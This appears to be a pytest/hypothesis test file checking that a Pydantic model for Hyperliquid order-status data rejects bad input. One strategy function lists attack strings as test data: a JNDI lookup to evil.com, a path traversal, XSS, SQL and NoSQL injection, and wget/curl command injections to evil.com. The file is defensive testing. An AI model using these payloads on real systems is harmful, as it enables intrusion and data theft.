"""Property-based tests for Hyperliquid raw order status models.

These tests validate critical security boundary models that process external order status data.
The models tested here are essential for order tracking, execution monitoring, and position management.

SECURITY CRITICAL: These raw models protect against:
- Malicious order status data that could manipulate trading decisions
- Financial precision errors in order prices and sizes
- Order ID manipulation that could affect execution tracking
- Status manipulation that could change order lifecycle behavior
- Timestamp manipulation that could affect execution ordering
- Buffer overflow attacks through oversized order data

Property testing ensures comprehensive coverage of order status edge cases and adversarial inputs.
"""

import json
from decimal import Decimal
from typing import Any

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_open_orders import (
    HyperliquidRawOrderStatusResponse,
)
from cyberdelta.apis.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR ORDER STATUS MODEL TESTING
# =============================================================================


def decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for prices and amounts."""
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=8).map(
            str
        ),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal("100000"), places=6).map(str),
        st.just("0"),
        st.just("0.01"),
        st.just("1.0"),
        st.just("100.0"),
        st.just("1234.56"),
        st.just("50000.123456"),
        st.just("0.00000001"),
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
        # Negative values (may be valid for some order types)
        st.just("-1.0"),
        st.just("-100.5"),
    ])


def positive_decimal_str_strategy() -> SearchStrategy[str]:
    """Generate valid positive decimal strings."""
    return st.one_of([
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=8).map(
            str
        ),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal("100000"), places=6).map(str),
        st.just("0.01"),
        st.just("1.0"),
        st.just("100.0"),
        st.just("1234.56"),
        st.just("50000.123456"),
    ])


def coin_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid coin symbols."""
    return st.one_of([
        st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ATOM", "DOT"]),
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_/"
            ),
        ),
    ])


def order_side_strategy() -> SearchStrategy[str]:
    """Generate valid order side values."""
    return st.sampled_from(["B", "S", "A"])  # Buy, Sell, Ask


def order_status_strategy() -> SearchStrategy[str]:
    """Generate valid order status values."""
    return st.sampled_from([
        "open",
        "filled",
        "canceled",
        "partial",
        "rejected",
        "pending",
        "working",
        "stopped",
        "expired",
    ])


def tif_strategy() -> SearchStrategy[str]:
    """Generate valid TIF (Time In Force) values."""
    return st.sampled_from(["Gtc", "Ioc", "Alo"])


def order_type_strategy() -> SearchStrategy[str]:
    """Generate valid order type values."""
    return st.sampled_from(["limit", "market", "stop", "stop_limit"])


def client_order_id_strategy() -> SearchStrategy[str | None]:
    """Generate valid client order ID strings."""
    return st.one_of([
        st.none(),  # Optional field
        st.text(
            min_size=1,
            max_size=128,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_"
            ),
        ),
    ])


@st.composite
def valid_raw_order_data(draw) -> dict[str, Any]:
    """Generate valid raw order data."""
    return {
        "oid": draw(st.integers(min_value=0, max_value=2**63 - 1)),
        "cloid": draw(client_order_id_strategy()),
        "coin": draw(coin_symbol_strategy()),
        "side": draw(order_side_strategy()),
        "limitPx": draw(decimal_str_strategy()),
        "sz": draw(positive_decimal_str_strategy()),
        "timestamp": draw(st.integers(min_value=0, max_value=2**63 - 1)),
        "triggerCondition": draw(st.text(max_size=256)),
        "isTrigger": draw(st.booleans()),
        "triggerPx": draw(decimal_str_strategy()),
        "children": draw(st.lists(st.integers(), max_size=10)),
        "isPositionTpsl": draw(st.booleans()),
        "reduceOnly": draw(st.booleans()),
        "orderType": draw(order_type_strategy()),
        "origSz": draw(positive_decimal_str_strategy()),
        "tif": draw(tif_strategy()),
    }


@st.composite
def valid_order_status_order_data(draw) -> dict[str, Any]:
    """Generate valid order status order data."""
    return {
        "order": draw(valid_raw_order_data()),
        "status": draw(order_status_strategy()),
        "statusTimestamp": draw(st.integers(min_value=0, max_value=2**63 - 1)),
    }


@st.composite
def valid_order_status_response_data(draw) -> dict[str, Any]:
    """Generate valid order status response data."""
    return {
        "status": draw(order_status_strategy()),
        "order": draw(valid_order_status_order_data()),
    }


def malicious_order_status_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for order status security testing."""
    return st.one_of([
        # Order status manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-orders}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('order-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE orders;--"),
        st.just("1' UNION SELECT * FROM positions--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("O" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.orders.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 1000000"}'),
        # Invalid decimals
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("not_a_number"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW ORDER STATUS RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawOrderStatusResponseProperties:
    """Property-based tests for order status response validation and security."""

    @given(status_data=valid_order_status_response_data())
    def test_order_status_validation_success_properties(self, status_data: dict[str, Any]) -> None:
        """Property: Valid order status data should always create valid response objects."""
        # Skip invalid data for raw order
        order_data = status_data["order"]["order"]
        assume(isinstance(order_data["oid"], int) and order_data["oid"] >= 0)
        assume(isinstance(order_data["coin"], str) and order_data["coin"].strip())
        assume(len(order_data["coin"].encode("utf-8")) <= 64)
        assume(order_data["side"] in ["B", "S", "A"])
        assume(isinstance(order_data["isTrigger"], bool))
        assume(isinstance(order_data["isPositionTpsl"], bool))
        assume(isinstance(order_data["reduceOnly"], bool))
        assume(isinstance(order_data["timestamp"], int) and order_data["timestamp"] >= 0)
        assume(
            isinstance(status_data["order"]["statusTimestamp"], int)
            and status_data["order"]["statusTimestamp"] >= 0
        )

        # Validate decimal fields
        for field in ["limitPx", "sz", "triggerPx", "origSz"]:
            value = order_data[field]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
                if field in ["sz", "origSz"]:
                    assume(decimal_val >= 0)
            except (ValueError, TypeError):
                assume(False)

        # Validate optional cloid
        if order_data["cloid"] is not None:
            assume(isinstance(order_data["cloid"], str) and order_data["cloid"].strip())
            assume(len(order_data["cloid"].encode("utf-8")) <= 128)

        # Validate strings
        assume(isinstance(order_data["triggerCondition"], str))
        assume(len(order_data["triggerCondition"].encode("utf-8")) <= 256)
        assume(order_data["orderType"] in ["limit", "market", "stop", "stop_limit"])
        assume(order_data["tif"] in ["Gtc", "Ioc", "Alo"])

        # Validate lists
        assume(isinstance(order_data["children"], list))
        for child in order_data["children"]:
            assume(isinstance(child, int))

        # Validate status values
        assume(
            status_data["status"]
            in [
                "open",
                "filled",
                "canceled",
                "partial",
                "rejected",
                "pending",
                "working",
                "stopped",
                "expired",
            ]
        )
        assume(
            status_data["order"]["status"]
            in [
                "open",
                "filled",
                "canceled",
                "partial",
                "rejected",
                "pending",
                "working",
                "stopped",
                "expired",
            ]
        )

        obj = HyperliquidRawOrderStatusResponse.model_validate(status_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawOrderStatusResponse)
        assert obj.status == status_data["status"]
        assert obj.order is not None
        assert obj.order.order.oid == order_data["oid"]
        assert obj.order.order.coin == order_data["coin"]
        assert obj.order.order.side == order_data["side"]

        # Property: Decimal fields should be normalized
        assert Decimal(obj.order.order.limit_px) == Decimal(order_data["limitPx"])
        assert Decimal(obj.order.order.sz) == Decimal(order_data["sz"])

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["status", "order"]),
        malicious_value=malicious_order_status_strategy(),
    )
    def test_order_status_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Order status response should reject malicious inputs safely."""
        base_data = {
            "status": "open",
            "order": {
                "order": {
                    "oid": 12345,
                    "cloid": None,
                    "coin": "ETH",
                    "side": "B",
                    "limitPx": "2000.50",
                    "sz": "0.5",
                    "timestamp": 1700000000000,
                    "triggerCondition": "",
                    "isTrigger": False,
                    "triggerPx": "0.0",
                    "children": [],
                    "isPositionTpsl": False,
                    "reduceOnly": False,
                    "orderType": "limit",
                    "origSz": "0.5",
                    "tif": "Gtc",
                },
                "status": "open",
                "statusTimestamp": 1700000000000,
            },
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawOrderStatusResponse.model_validate(base_data)

    @given(
        invalid_order_field=st.one_of([
            st.text(),  # String instead of dict
            st.integers(),  # Integer instead of dict
            st.lists(st.text()),  # List instead of dict
            st.none(),  # None instead of dict
            st.booleans(),  # Boolean instead of dict
        ])
    )
    def test_order_status_invalid_order_field_properties(self, invalid_order_field: Any) -> None:
        """Property: Order status response should validate order field type."""
        status_data = {
            "status": "open",
            "order": invalid_order_field,
        }

        # Property: Invalid order field types should be rejected
        with pytest.raises((ValidationError, TypeFieldError)):
            HyperliquidRawOrderStatusResponse.model_validate(status_data)

    def test_order_status_missing_field_properties(self) -> None:
        """Property: Order status response should require order field."""
        status_data = {"status": "open"}

        # Property: Missing order field should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawOrderStatusResponse.model_validate(status_data)

    @given(
        invalid_decimal=st.one_of([
            st.just(""),
            st.just("   "),
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("not_a_number"),
            st.just("1..0"),
        ])
    )
    def test_order_status_invalid_decimal_properties(self, invalid_decimal: str) -> None:
        """Property: Order status response should validate decimal constraints in nested order."""
        status_data = {
            "status": "open",
            "order": {
                "order": {
                    "oid": 12345,
                    "cloid": None,
                    "coin": "ETH",
                    "side": "B",
                    "limitPx": invalid_decimal,  # Invalid decimal
                    "sz": "0.5",
                    "timestamp": 1700000000000,
                    "triggerCondition": "",
                    "isTrigger": False,
                    "triggerPx": "0.0",
                    "children": [],
                    "isPositionTpsl": False,
                    "reduceOnly": False,
                    "orderType": "limit",
                    "origSz": "0.5",
                    "tif": "Gtc",
                },
                "status": "open",
                "statusTimestamp": 1700000000000,
            },
        }

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(invalid_decimal.strip() if invalid_decimal else "")
            is_finite = decimal_val.is_finite()
            is_empty = not invalid_decimal.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = HyperliquidRawOrderStatusResponse.model_validate(status_data)
                assert Decimal(obj.order.order.limit_px) == decimal_val
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                    HyperliquidRawOrderStatusResponse.model_validate(status_data)

        except (ValueError, TypeError):
            # Property: Unparseable strings should be rejected
            with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                HyperliquidRawOrderStatusResponse.model_validate(status_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_order_status_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: Order status response should forbid extra fields."""
        status_data = {
            "status": "open",
            "order": {
                "order": {
                    "oid": 12345,
                    "cloid": None,
                    "coin": "ETH",
                    "side": "B",
                    "limitPx": "2000.50",
                    "sz": "0.5",
                    "timestamp": 1700000000000,
                    "triggerCondition": "",
                    "isTrigger": False,
                    "triggerPx": "0.0",
                    "children": [],
                    "isPositionTpsl": False,
                    "reduceOnly": False,
                    "orderType": "limit",
                    "origSz": "0.5",
                    "tif": "Gtc",
                },
                "status": "open",
                "statusTimestamp": 1700000000000,
            },
        }
        status_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawOrderStatusResponse.model_validate(status_data)

    @given(status_data=valid_order_status_response_data())
    def test_order_status_json_serialization_properties(self, status_data: dict[str, Any]) -> None:
        """Property: Order status response should maintain JSON serialization compatibility."""
        # Skip invalid data
        order_data = status_data["order"]["order"]
        assume(isinstance(order_data["oid"], int) and order_data["oid"] >= 0)
        assume(isinstance(order_data["coin"], str) and order_data["coin"].strip())
        assume(len(order_data["coin"].encode("utf-8")) <= 64)
        assume(order_data["side"] in ["B", "S", "A"])
        assume(isinstance(order_data["timestamp"], int) and order_data["timestamp"] >= 0)

        # Validate decimal fields
        for field in ["limitPx", "sz", "triggerPx", "origSz"]:
            value = order_data[field]
            assume(isinstance(value, str) and value.strip())
            try:
                decimal_val = Decimal(value.strip())
                assume(decimal_val.is_finite())
            except (ValueError, TypeError):
                assume(False)

        obj = HyperliquidRawOrderStatusResponse.model_validate(status_data)
        json_str = obj.model_dump_json()
        parsed_json = json.loads(json_str)

        # Property: Should be able to reconstruct from JSON
        reconstructed = HyperliquidRawOrderStatusResponse.model_validate(parsed_json)
        assert reconstructed.status == obj.status
        assert reconstructed.order.order.oid == obj.order.order.oid


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawOrderStatusResponse_valid_response() -> None:
    """Test successful parsing of a valid order status response."""
    valid_raw_order_data = {
        "oid": 12345,
        "cloid": None,
        "coin": "ETH",
        "side": "B",
        "limitPx": "2000.50",
        "sz": "0.5",
        "timestamp": 1700000000000,
        "triggerCondition": "",
        "isTrigger": False,
        "triggerPx": "0.0",
        "children": [],
        "isPositionTpsl": False,
        "reduceOnly": False,
        "orderType": "limit",
        "origSz": "0.5",
        "tif": "Gtc",
    }

    valid_data = {
        "status": "open",
        "order": {
            "order": valid_raw_order_data,
            "status": "open",
            "statusTimestamp": 1700000000000,
        },
    }
    obj = HyperliquidRawOrderStatusResponse.model_validate(valid_data)
    assert obj.order is not None
    assert obj.order.order.oid == 12345
    assert obj.order.order.coin == "ETH"
    assert obj.order.order.limit_px == "2000.5"  # Decimal normalization
    assert obj.order.order.sz == "0.5"
    assert obj.order.order.side == "B"
    assert obj.status == "open"


def test_HyperliquidRawOrderStatusResponse_missing_order_field() -> None:
    """Test validation fails if the required 'order' field is missing."""
    invalid_data: dict[str, Any] = {"status": "open"}
    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawOrderStatusResponse.model_validate(invalid_data)
    assert "Field required" in str(exc_info.value)
    assert "order" in str(exc_info.value)


def test_HyperliquidRawOrderStatusResponse_invalid_order_structure() -> None:
    """Test validation fails if the 'order' field has an invalid structure."""
    invalid_order_data = {
        "oid": 12345,
        "cloid": None,
        "coin": "ETH",
        "side": "B",
        "limitPx": "invalid-price",  # Invalid format
        "sz": "0.5",
        "timestamp": 1700000000000,
        "triggerCondition": "",
        "isTrigger": False,
        "triggerPx": "0.0",
        "children": [],
        "isPositionTpsl": False,
        "reduceOnly": False,
        "orderType": "limit",
        "origSz": "0.5",
        "tif": "Gtc",
    }

    invalid_data = {
        "status": "open",
        "order": {
            "order": invalid_order_data,
            "status": "open",
            "statusTimestamp": 1700000000000,
        },
    }
    with pytest.raises(ValidationError):
        HyperliquidRawOrderStatusResponse.model_validate(invalid_data)


def test_HyperliquidRawOrderStatusResponse_extra_field_forbidden() -> None:
    """Test validation fails if extra fields are provided."""
    valid_order_data = {
        "oid": 12345,
        "cloid": None,
        "coin": "ETH",
        "side": "B",
        "limitPx": "2000.50",
        "sz": "0.5",
        "timestamp": 1700000000000,
        "triggerCondition": "",
        "isTrigger": False,
        "triggerPx": "0.0",
        "children": [],
        "isPositionTpsl": False,
        "reduceOnly": False,
        "orderType": "limit",
        "origSz": "0.5",
        "tif": "Gtc",
    }

    invalid_data = {
        "status": "open",
        "order": {
            "order": valid_order_data,
            "status": "open",
            "statusTimestamp": 1700000000000,
        },
        "extra_field": 123,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawOrderStatusResponse.model_validate(invalid_data)


def test_HyperliquidRawOrderStatusResponse_invalid_order_field_types() -> None:
    """Test validation fails if the 'order' field is not a dictionary."""
    for invalid_order in ["not_a_dict", [1, 2, 3], 123, None]:
        invalid_data = {"status": "open", "order": invalid_order}
        with pytest.raises(ValidationError):
            HyperliquidRawOrderStatusResponse.model_validate(invalid_data)
